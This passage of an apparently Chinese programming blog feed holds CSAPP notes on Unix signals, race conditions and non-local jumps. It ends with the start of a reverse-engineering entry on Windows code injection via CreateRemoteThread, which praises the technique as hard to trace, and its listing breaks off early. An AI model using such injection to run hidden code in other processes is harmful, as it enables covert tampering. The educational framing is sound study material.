class="hljs-keyword">struct</span> sigaction *oldact)</span>;<br><span class="hljs-comment">//成功则返回0，出错则为-1</span><br></code></pre></td></tr></table></figure><p>定义一个包装函数，称之为<code>Signal</code>调用<code>sigaction</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">handler_t</span> *<span class="hljs-title function_">Signal</span><span class="hljs-params">(<span class="hljs-type">int</span> signum,<span class="hljs-type">handler_t</span> *handler)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sigaction</span> <span class="hljs-title">action</span>, <span class="hljs-title">old_action</span>;</span><br>    action.sa_handler = handler;<br>    sigemptyset(&amp;action.sa_mask);<br>    action.sa_flags = SA_RESTART;<br>    <br>    <span class="hljs-keyword">if</span>(sigaction(signum,&amp;action,&amp;old_action) &lt; <span class="hljs-number">0</span>)<br>        unix_error(<span class="hljs-string">&quot;Signal error&quot;</span>);<br>   <span class="hljs-keyword">return</span>(old_action.sa_handler);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="8-5-6-同步流以避免讨厌的并发错误"><a href="#8-5-6-同步流以避免讨厌的并发错误" class="headerlink" title="8.5.6 同步流以避免讨厌的并发错误"></a>8.5.6 同步流以避免讨厌的并发错误</h4><p><strong>code&#x2F;ecf&#x2F;procmask1.c</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">handler</span><span class="hljs-params">(<span class="hljs-type">int</span> sig)</span><br>&#123;<br>    <span class="hljs-type">int</span> olderrno = errno;<br>    <span class="hljs-type">sigset_t</span> mask_all, prev_all;<br>    <span class="hljs-type">pid_t</span> pid;<br>    <br>    Sigfillset(&amp;mask_all);<br>    <span class="hljs-keyword">while</span>((pid = waitpid(<span class="hljs-number">-1</span>,<span class="hljs-literal">NULL</span>,<span class="hljs-number">0</span>))&gt;<span class="hljs-number">0</span>)&#123;<br>        Sigprocmask(SIG_BLOCK,&amp;mask_all,&amp;prev_all);<br>        deletejob(pid);<br>        Sigprocmask(SIG_SETMASK,&amp;prev_all,<span class="hljs-literal">NULL</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(errno != ECHILD)<br>        Sio_error(<span class="hljs-string">&quot;waitpid error&quot;</span>);<br>   errno = olderrno;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc,<span class="hljs-type">char</span> **argv)</span><br>&#123;<br>    <span class="hljs-type">int</span> pid;<br>    <span class="hljs-type">sigset_t</span> mask_all,prev_all;<br>    <br>    Sigfillset(&amp;mask_all);<br>    Signal(SIGCHLD,handler);<br>    initjobs();<br>    <br>    <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>)&#123;<br>        <span class="hljs-keyword">if</span>((pid = Fork()) == <span class="hljs-number">0</span>)&#123;<br>            Execve(<span class="hljs-string">&quot;/bin/date&quot;</span>,argv,<span class="hljs-literal">NULL</span>);<br>    &#125;<br>        Sigprocmask(SIG_BLOCK,&amp;mask_all,&amp;prev_all);<br>        addjob(pid);<br>        Sigprocmask(SIG_SETMASK,&amp;prev_all,<span class="hljs-literal">NULL</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>上述代码可能会导致条件竞争</p><ul><li>父进程执行<code>fork</code>函数，内核调度新创建的子进程运行</li><li>子进程终止，传递一个<code>SIGCHLD</code>信号给父进程</li><li>父进程执行前发现有未处理的信号</li><li>信号处理程序回收终止子进程，并且调用<code>deletejob</code>，但是父进程还没有把子进程放进作业中</li><li>信号处理程序完毕后，内核继续运行父进程，父进程从<code>fork</code>返回后，将回收的子进程又添加到作业中</li></ul><p><strong>code&#x2F;efc&#x2F;procmask2.c</strong></p><p>在父进程<code>fork</code>之前阻塞<code>SIGCHLD</code>，在<code>addjob</code>之后才解除，则避免了在<code>addjob</code>之前<code>deletejob</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">handler</span><span class="hljs-params">(<span class="hljs-type">int</span> sig)</span><br>&#123;<br>    <span class="hljs-type">int</span> olderrno = errno;<br>    <span class="hljs-type">sigset_t</span> mask_all,prev_all;<br>    <span class="hljs-type">pid_t</span> pid;<br>    <br>    Sigfillset(&amp;mask_all);<br>    <span class="hljs-keyword">while</span>((pid = waitpid(<span class="hljs-number">-1</span>,<span class="hljs-literal">NULL</span>,<span class="hljs-number">0</span>))&gt;<span class="hljs-number">0</span>)<br>    &#123;<br>        Sigprocmask(SIG_BLOCK,&amp;mask_all,&amp;prev_all);<br>        deletejob(pid);<br>        Sigprocmask(SIG_SETMASK,&amp;prev_all,<span class="hljs-literal">NULL</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(errno != ECHILD)<br>        Sio_error(<span class="hljs-string">&quot;waitpid error&quot;</span>);<br>    errno = olderrno;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc,<span class="hljs-type">char</span> **argv)</span><br>&#123;<br>    <span class="hljs-type">int</span> pid;<br>    <span class="hljs-type">sigset_t</span> mask_all,mask_one,prev_one;<br>    <br>    Sigfillset(&amp;mask_all);<br>    Sigemptyset(&amp;mask_one);<br>    Sigaddset(&amp;mask_one,SIGCHLD);<br>    Signal(SIGCHLD,handler);<br>    initjobs();<br>    <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>)&#123;<br>        Sigprocmask(SIG_BLOCK,&amp;mask_one,&amp;prev_one);<br>        <span class="hljs-keyword">if</span>((pid = Fork()) == <span class="hljs-number">0</span>)&#123;<br>            Sigprocmask(SIG_SETMASK,&amp;prev_one,<span class="hljs-literal">NULL</span>);<br>            Execve(<span class="hljs-string">&quot;/bin/data&quot;</span>,argv,<span class="hljs-literal">NULL</span>);<br>        &#125;<br>        Sigprocmask(SIG_BLOCK,&amp;mask_all,<span class="hljs-literal">NULL</span>);<br>        addjob(pid);<br>        Sigprocmask(SIG_SETMASK,&amp;prev_one,<span class="hljs-literal">NULL</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="8-5-7-显示地等待信号"><a href="#8-5-7-显示地等待信号" class="headerlink" title="8.5.7 显示地等待信号"></a>8.5.7 显示地等待信号</h4><p>有时候主程序需要显示地等待某个信号处理程序运行</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;csapp.h&quot;</span></span><br><br><span class="hljs-keyword">volatile</span> <span class="hljs-type">sig_atomic_t</span> pid;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">sigchld_handler</span><span class="hljs-params">(<span class="hljs-type">int</span> s)</span><br>&#123;<br>    <span class="hljs-type">int</span> olderrno = errno;<br>    pid = waitpid(<span class="hljs-number">-1</span>,<span class="hljs-literal">NULL</span>,<span class="hljs-number">0</span>);<br>    errno = olderrno;<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">sigint_handler</span><span class="hljs-params">(<span class="hljs-type">int</span> s)</span><br>&#123;<br>    <br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc,<span class="hljs-type">char</span> **argv)</span><br>&#123;<br>    <span class="hljs-type">sigset_t</span> mask,prev;<br>    <br>    Signal(SIGCHLD,sigchld_handler);<br>    Signal(SIGINT,sigint_handler);<br>    Sigemptyset(&amp;mask);<br>    Sigaddset(&amp;mast,SIGCHLD);<br>    <br>    <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>)&#123;<br> <span class="hljs-comment">//忽略SIGCHLD信号，防止条件竞争</span><br>       Sigprocmask(SIG_BLOCK,&amp;mask,&amp;prev);<br>        <span class="hljs-keyword">if</span>(Fork() == <span class="hljs-number">0</span>)<br>            <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>        pid = <span class="hljs-number">0</span>;<br>        Sigprocmask(SIG_SETMASK,&amp;prev,<span class="hljs-literal">NULL</span>);<br>        <span class="hljs-keyword">while</span>(!pid)<span class="hljs-comment">//等到SIGCHLD信号处理程序执行后主程序才接着执行</span><br>            ;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;.&quot;</span>);<br>    &#125;<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>循环会浪费处理器资源，因此可以修改为其他代码使用</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">while</span>(!pid)<br>pause()<br></code></pre></td></tr></table></figure><p>但是若信号在<code>while</code>语句后，<code>pause()</code>语句前到达，那么程序将永久休眠</p><p>使用<code>sleep</code>替换<code>pause</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">while</span>(!pid)<br>sleep(<span class="hljs-number">1</span>);<br></code></pre></td></tr></table></figure><p>但是使用<code>sleep</code>执行会浪费大量时间，若改为高精度的休眠函数则休眠时间太短则会造成<code>while</code>语句执行次数过多，若休眠时间太长则又会导致程序运行时间太久。</p><p>使用函数<code>sigsuspend</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">sigsuspend</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">sigset_t</span> *mask)</span>;<br><br><span class="hljs-comment">//等价于</span><br>sigprocmask(SIG_SETMASK,&amp;mask,&amp;prev);<br>pause();<br>sigprocmask(SIG_SETMASK,&amp;prev,<span class="hljs-literal">NULL</span>);<br></code></pre></td></tr></table></figure><p><strong>code&#x2F;ecf&#x2F;sigsuspend.c</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;csapp.h&quot;</span></span><br><br><span class="hljs-keyword">volatile</span> <span class="hljs-type">sig_atomic_t</span> pid;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">sigchld_handler</span><span class="hljs-params">(<span class="hljs-type">int</span> s)</span><br>&#123;<br>    <span class="hljs-type">int</span> olderrno = errno;<br>    pid = waitpid(<span class="hljs-number">-1</span>,<span class="hljs-literal">NULL</span>,<span class="hljs-number">0</span>);<br>    errno = olderrno;<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">sigint_handler</span><span class="hljs-params">(<span class="hljs-type">int</span> s)</span><br>&#123;<br>    <br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc,<span class="hljs-type">char</span> **argv)</span><br>&#123;<br>    <span class="hljs-type">sigset_t</span> mask,prev;<br>    <br>    Signal(SIGCHLD,sigchld_handler);<br>    Signal(SIGINT,sigint_handler);<br>    Sigemptyset(&amp;mask);<br>    Sigaddset(&amp;mast,SIGCHLD);<br>    <br>    <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>)&#123;<br> <span class="hljs-comment">//忽略SIGCHLD信号，防止条件竞争</span><br>       Sigprocmask(SIG_BLOCK,&amp;mask,&amp;prev);<br>        <span class="hljs-keyword">if</span>(Fork() == <span class="hljs-number">0</span>)<br>            <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>        pid = <span class="hljs-number">0</span>;<br>        Sigprocmask(SIG_SETMASK,&amp;prev,<span class="hljs-literal">NULL</span>);<br>        <span class="hljs-keyword">while</span>(!pid)<br>            sigsuspend(&amp;prev);<br> Sigprocmast(SIG_SETMASK,&amp;prev,<span class="hljs-literal">NULL</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;.&quot;</span>);<br>    &#125;<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="8-6-非本地跳转"><a href="#8-6-非本地跳转" class="headerlink" title="8.6 非本地跳转"></a>8.6 非本地跳转</h2><p>非本地跳转是通过<code>setjmp</code>和<code>longjmp</code>函数来提供的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;setjmp.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">setjmp</span><span class="hljs-params">(jmp_buf env)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">sigsetjmp</span><span class="hljs-params">(sigjmp_buf env, <span class="hljs-type">int</span> savesigs)</span>;<br><br><span class="hljs-comment">//返回:setjmp返回0，longjmp返回非零。</span><br></code></pre></td></tr></table></figure><p><code>setjmp</code>函数在<code>env</code>缓冲区中保存当前调用环境，供后面的<code>longjmp</code>使用，并返回0。</p><p>调用环境包括程序计数器、栈指针和通用目的寄存器。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;setjmp.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">longjmp</span><span class="hljs-params">(jmp_buf env, <span class="hljs-type">int</span> retval)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">siglongjmp</span><span class="hljs-params">(sigjmp_buf env,<span class="hljs-type">int</span> retval)</span>;<br><span class="hljs-comment">//从不返回</span><br></code></pre></td></tr></table></figure><p><code>longjmp</code>函数从<code>env</code>缓冲区中恢复调用环境，然后触发一个从最近一次初始化<code>env</code>的<code>setjmp</code>调用的返回。然后<code>setjmp</code>返回，并带有非零的返回值<code>retval</code></p><p><strong>code&#x2F;efc&#x2F;setjmp.c</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;csapp.h&quot;</span></span><br><br>jmp_buf buf; <span class="hljs-comment">//调用环境</span><br><span class="hljs-type">int</span> error1 = <span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> error2 = <span class="hljs-number">1</span>;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">foo</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>,<span class="hljs-title function_">bar</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-keyword">switch</span>(setjmp(buf))&#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:<br>            foo();<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Detected an error1 condition in foo\n&quot;</span>);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Detected an error2 condition in foo\n&quot;</span>);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">default</span>:<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Unkonw error condition in foo\n&quot;</span>);<br>    &#125;<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">foo</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-comment">//若遇到错误则直接从setjmp返回</span><br>    <span class="hljs-keyword">if</span>(error1)<br>        longjmp(buf,<span class="hljs-number">1</span>);<br>    bar();<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">bar</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-comment">//若遇到错误则直接从setjmp返回</span><br>    <span class="hljs-keyword">if</span>(error2)<br>        longjmp(buf,<span class="hljs-number">2</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>longjmp</code>允许它跳过所有中间调用的特性可能会产生意外的后果，例如函数内部分配了资源，应该在函数结束时释放资源，但是由于<code>longjmp</code>跳过了释放的过程导致了内存泄露。</p><p><strong>code&#x2F;ecf&#x2F;restart.c</strong></p><p>非本地跳转的另一个重要应用是使一个信号处理程序分支到一个特殊的代码位置。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;csapp.h&quot;</span></span><br><br>sigjmp_buf buf;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">handler</span><span class="hljs-params">(<span class="hljs-type">int</span> sig)</span><br>&#123;<br>    siglongjmp(buf,<span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-comment">//设置跳转</span><br>    <span class="hljs-keyword">if</span>(!sigsetjmp(buf,<span class="hljs-number">1</span>))&#123;<br>        <span class="hljs-comment">//设置信号处理程序</span><br>        Signal(SIGINT,handler);<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>        Sio_puts(<span class="hljs-string">&quot;restarting\n&quot;</span>);<br>    <br>    <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>)&#123;<br>        Sleep(<span class="hljs-number">1</span>);<br>       Sio_puts(<span class="hljs-string">&quot;processing...\n&quot;</span>);<br>    &#125;<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>C++和Java中的软件异常</strong></p><p><code>C++</code>和<code>Java</code>提供的异常机制是较高层次的，是C语言的<code>setjmp</code>和<code>longjmp</code>函数的更加结构化的版本。</p><p><code>try</code>语句中的<code>catch</code>子句类似于<code>setjmp</code>函数，<code>throw</code>语句类似于<code>longjmp</code>函数</p><h2 id="8-7-操作进程的工具"><a href="#8-7-操作进程的工具" class="headerlink" title="8.7 操作进程的工具"></a>8.7 操作进程的工具</h2><ul><li><code>STRACE</code>：打印一个正在运行的程序和它的子进程调用的每个系统调用的轨迹。</li><li><code>PS</code>：列出当前系统中的进程</li><li><code>TOP</code>：打印出关于当前进程资源使用的信息</li><li><code>PMAP</code>：显示进程的内存映射</li><li><code>/proc</code>：一个虚拟文件系统，以<code>ASCII</code>文本格式输出大量内核数据结构的内容，用户程序可以读取这些内容<ul><li>输入<code>cat/proc/loadavg</code>可以看到<code>linux</code>系统上的平均负载</li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>计算机基础</category>
      
    </categories>
    
    
    <tags>
      
      <tag>计算机基础</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>逆向工程核心原理--代码注入</title>
    <link href="/2023/06/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86--%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/"/>
    <url>/2023/06/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86--%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h1 id="代码注入"><a href="#代码注入" class="headerlink" title="代码注入"></a>代码注入</h1><p>代码注入是一种向目标进程插入独立运行代码的技术。一般调用<code>CreateRemoteThread()</code>API以远程线程形式运行插入的代码，也被称之为线程注入。</p><h2 id="代码注入与DLL注入"><a href="#代码注入与DLL注入" class="headerlink" title="代码注入与DLL注入"></a>代码注入与DLL注入</h2><h3 id="使用代码注入的原因"><a href="#使用代码注入的原因" class="headerlink" title="使用代码注入的原因"></a>使用代码注入的原因</h3><ul><li>占用内存少</li><li>难以查找痕迹</li><li>其他：不需要额外的<code>DLL</code>文件，只要又代码注入程序。</li></ul><h3 id="InjectCode"><a href="#InjectCode" class="headerlink" title="InjectCode"></a>InjectCode</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;Windows.h&gt;</span></span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">_THREAD_PARAM</span><br>&#123;<br><span class="hljs-comment">//typedef int (FAR WINAPI *FARPROC)();</span><br>FARPROC pFunc[<span class="hljs-number">2</span>]; <span class="hljs-comment">//LoadLibraryA(),GetProcAddress()</span><br><span class="hljs-type">char</span> szBuf[<span class="hljs-number">4</span>][<span class="hljs-number">128</span>]; <span class="hljs-comment">//user32.dll , 